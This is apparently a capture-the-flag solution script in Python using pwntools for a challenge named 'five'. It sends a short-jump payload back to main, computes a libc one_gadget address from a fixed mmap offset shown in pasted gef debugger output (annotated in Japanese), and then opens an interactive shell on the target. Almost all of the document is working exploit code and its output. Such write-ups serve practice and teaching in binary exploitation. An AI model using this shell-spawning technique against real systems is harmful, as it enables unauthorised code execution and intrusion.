from pwn import *

# context.log_level = "debug"

# p = remote("tamuctf.com", 443, ssl=True, sni="five")
p = remote("localhost", 1337)

payload = b'\xe9' + p32(0xffff01a3) # jmp main
p.send(payload)

'''
gef➤  x/2i $pc-5
   0x5578469721df <main+55>:    call   0x557846972040 <mmap@plt>
=> 0x5578469721e4 <main+60>:    mov    QWORD PTR [rbp-0x8],rax

gef➤  vmmap libc
Start              End                Offset             Perm Path
0x00007fba2011a000 0x00007fba2013c000 0x0000000000000000 r-- /lib/x86_64-linux-gnu/libc-2.28.so
0x00007fba2013c000 0x00007fba20283000 0x0000000000022000 r-x /lib/x86_64-linux-gnu/libc-2.28.so
0x00007fba20283000 0x00007fba202cf000 0x0000000000169000 r-- /lib/x86_64-linux-gnu/libc-2.28.so
0x00007fba202cf000 0x00007fba202d0000 0x00000000001b5000 --- /lib/x86_64-linux-gnu/libc-2.28.so
0x00007fba202d0000 0x00007fba202d4000 0x00000000001b5000 r-- /lib/x86_64-linux-gnu/libc-2.28.so
0x00007fba202d4000 0x00007fba202d6000 0x00000000001b9000 rw- /lib/x86_64-linux-gnu/libc-2.28.so

gef➤  p/x $rax - 0x00007fba2011a000
$4 = 0x1c6000 <--- 2回目のmmapの戻り値とlibcのオフセットは固定
'''

one_gadget = 0x4497f

payload = b'\xe9' + p32(0xffe39ffb + 0x4497f)
p.send(payload)

p.interactive()
